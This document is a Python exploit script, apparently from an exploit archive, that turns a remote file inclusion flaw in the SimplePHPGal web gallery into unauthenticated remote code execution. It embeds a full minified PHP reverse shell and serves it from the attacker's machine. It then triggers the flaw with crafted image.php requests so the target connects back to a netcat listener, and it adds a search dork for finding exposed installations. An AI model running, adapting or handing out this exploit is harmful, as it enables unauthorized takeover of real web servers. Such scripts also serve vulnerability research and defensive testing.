# Exploit Title: SimplePHPGal - RFI --> RCE (Unauthenticated)
# Date: 2022-5-18
# Author: BeauKnowsTech
# Vendor Homepage: https://johncaruso.ca
# Software Link: https://johncaruso.ca/phpGallery/
# Software Link: https://sourceforge.net/projects/simplephpgal/
# Category : Web Application Bugs
# Dork : intext:"Created with Simple PHP Photo Gallery"
#        intext:"Created by John Caruso"
# CVE: N/A
# Tested using python 3.9.9
# Original finding: https://www.exploit-db.com/exploits/48424
# This should be used for educational purposes only. Don't forget to forward/allow attackerport/httpport ports. 

import argparse
import os
import threading
import requests
import time
from argparse import RawDescriptionHelpFormatter
from socketserver import ThreadingMixIn
from http.server import SimpleHTTPRequestHandler, HTTPServer

############## Arguments ##############
parser = argparse.ArgumentParser(description="This script uses an RFI in SimplePHPGal to get RCE  \n python3 SimplePHPGal-RCE.py http://192.168.1.12/ 192.168.1.5 4444 \n python3 SimplePHPGal-RCE.py http://192.168.1.12/ 192.168.1.5 4444 --httpport 8080", formatter_class=RawDescriptionHelpFormatter)
parser.add_argument('url', action='store', help='The URL of the target.')
parser.add_argument('attackerip', action='store', help='Kali IP address for reverse shell and http server')
parser.add_argument('attackerport', action='store', help='Port for the reverse shell.')
parser.add_argument('--httpport', action='store', help='Port for the http server. Default 80')
args = parser.parse_args()

url = args.url.rstrip('/')
attackerip = args.attackerip
attackerport = args.attackerport
if args.httpport:
    httpport = int(args.httpport)
else:
    httpport = 80

############## Write Payload to filesystem in working directory ##############
############## Payload should work for linux or windows based targets but I only tested on linux ##############
# Payload credit: https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/minified/php_reverse_shell_mini.php
payload = "<?php class Sh{private $a=null;private $p=null;private $os=null;private $sh=null;private $des=array(0=>array('pipe','r'),1=>array('pipe','w'),2=>array('pipe','w'));private $b=1024;private $c=0;private $e=false;public function __construct($a,$p){$this->a=$a;$this->p=$p;}private function det(){$d=true;if(stripos(PHP_OS,'LINUX')!==false){$this->os='LINUX';$this->sh='/bin/sh';}else if(stripos(PHP_OS,'WIN32')!==false||stripos(PHP_OS,'WINNT')!==false||stripos(PHP_OS,'WINDOWS')!==false){$this->os='WINDOWS';$this->sh='cmd.exe';}else{$d=false;echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\n\";}return $d;}private function daem(){$e=false;if(!function_exists('pcntl_fork')){echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\n\";}else if(($pid=@pcntl_fork())<0){echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\n\";}else if($pid>0){$e=true;echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\n\";}else if(posix_setsid()<0){echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n\";}else{echo \"DAEMONIZE: Completed successfully!\n\";}return $e;}private function set(){@error_reporting(0);@set_time_limit(0);@umask(0);}private function d($d){$d=str_replace('<','&lt;',$d);$d=str_replace('>','&gt;',$d);echo $d;}private function r($s,$n,$b){if(($d=@fread($s,$b))===false){$this->e=true;echo\"STRM_ERROR: Cannot read from {$n}, script will now exit...\n\";}return $d;}private function w($s,$n,$d){if(($by=@fwrite($s,$d))===false){$this->e=true;echo\"STRM_ERROR: Cannot write to {$n}, script will now exit...\n\";}return $by;}private function rw($i,$o,$in,$on){while(($d=$this->r($i,$in,$this->b))&&$this->w($o,$on,$d)){if($this->os==='WINDOWS'&&$on==='STDIN'){$this->c+=strlen($d);}$this->d($d);}}private function brw($i,$o,$in,$on){$f=fstat($input);$s=$f['size'];if($this->os==='WINDOWS'&&$in==='STDOUT'&&$this->c){while($this->c>0&&($by=$this->c>=$this->b?$this->b:$this->c)&&$this->r($i,$in,$by)){$this->c-=$by;$s-=$by;}}while($s>0&&($by=$s>=$this->b?$this->b:$s)&&($d=$this->r($i,$in,$by))&&$this->w($o,$on,$d)){$s-=$by;$this->d($d);}}public function rn(){if($this->det()&&!$this->daem()){$this->set();$soc=@fsockopen($this->a,$this->p,$ern,$ers,30);if(!$soc){echo\"SOC_ERROR: {$ern}: {$ers}\n\";}else{stream_set_blocking($soc,false);$proc=@proc_open($this->sh,$this->des,$ps,null,null);if(!$proc){echo \"PROC_ERROR: Cannot start the shell\n\";}else{foreach($ps as $p){stream_set_blocking($p,false);}$stat=proc_get_status($proc);@fwrite($soc,\"SOCKET: Shell has connected! PID: {$stat['pid']}\n\");do{$stat=proc_get_status($proc);if(feof($soc)){echo \"SOC_ERROR: Shell connection has been terminated\n\";break;}else if(feof($ps[1])||!$stat['running']){echo \"PROC_ERROR: Shell process has been terminated\n\";break;}$s=array('read'=>array($soc,$ps[1],$ps[2]),'write'=>null,'except'=>null);$ncs=@stream_select($s['read'],$s['write'],$s['except'],0);if($ncs===false){echo \"STRM_ERROR: stream_select() failed\n\";break;}else if($ncs>0){if($this->os==='LINUX'){if(in_array($soc,$s['read'])){$this->rw($soc,$ps[0],'SOCKET','STDIN');}if(in_array($ps[2],$s['read'])){$this->rw($ps[2],$soc,'STDERR','SOCKET');}if(in_array($ps[1],$s['read'])){$this->rw($ps[1],$soc,'STDOUT','SOCKET');}}else if($this->os==='WINDOWS'){if(in_array($soc,$s['read'])){$this->rw($soc,$ps[0],'SOCKET','STDIN');}if(($f=fstat($pipes[2]))&&$f['size']){$this->brw($ps[2],$soc,'STDERR','SOCKET');}if(($f=fstat($pipes[1]))&&$f['size']){$this->brw($ps[1],$soc,'STDOUT','SOCKET');}}}}while(!$this->e);foreach($ps as $p){fclose($p);}proc_close($proc);}fclose($soc);}}}}echo '<pre>';$sh=new Sh('" + attackerip +"','" + attackerport +"');$sh->rn();unset($sh);/*@gc_collect_cycles();*/echo '</pre>'; ?>"
filehandle = open('rev.php', 'w')
filehandle.write(payload)
filehandle.close()

############## Run threaded HTTP server to serve RFI payload ##############
#https://gist.github.com/gnilchee/246474141cbe588eb9fb
#https://stackoverflow.com/questions/63928479/unable-to-run-python-http-server-in-background-with-threading

class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass

#This sets the working directory of the HTTPServer
CWD = os.getcwd()

server = ThreadingSimpleServer((attackerip, httpport), SimpleHTTPRequestHandler)
print("[✔] Serving HTTP traffic from", CWD, "on", attackerip, "using port", httpport, "in background")
thread = threading.Thread(target = server.serve_forever)
thread.daemon = True
thread.start()

############## Tell user to run nc -nlvp PORT ##############
input("Run 'nc -nlvp "+ attackerport +"' on attacker machine in another terminal. Then press any key to continue")


############## Threaded GET request to trigger reverse shell ##############
print("Attempting to reach reverse shell on", attackerip, "on port", httpport)
httpportstr = str(httpport)

def ACTIVATE_HAXOR():
    # Default config uses $_GET['i'] but orignal finding uses $_GET['img'] lets try both?
    getrequest_i = requests.get(url + '/image.php?i=http://'+ attackerip +':'+ httpportstr +'/rev.php', verify=False)
    getrequest = requests.get(url + '/image.php?img=http://'+ attackerip +':'+ httpportstr +'/rev.php', verify=False)
thread2 = threading.Thread(target=ACTIVATE_HAXOR)
thread2.daemon = False
thread2.start()

time.sleep(1)
print("Request sent. Check your nc for a connection")